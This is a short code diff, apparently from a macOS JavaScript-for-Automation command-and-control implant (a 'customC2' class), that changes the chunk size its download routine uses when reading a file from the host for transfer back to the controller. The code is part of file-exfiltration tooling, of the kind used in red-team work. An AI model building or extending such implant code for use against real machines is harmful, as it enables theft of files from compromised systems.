@@ -114,7 +114,7 @@ class customC2 extends baseC2{
         // download just has one parameter of the path of the file to download
         if( does_file_exist(params)){
             var offset = 0;
-            var chunkSize = 512000; //3500;
+            var chunkSize = 350000; //3500;
             var handle = $.NSFileHandle.fileHandleForReadingAtPath(params);
             // Get the file size by seeking;
             var fileSize = handle.seekToEndOfFile;
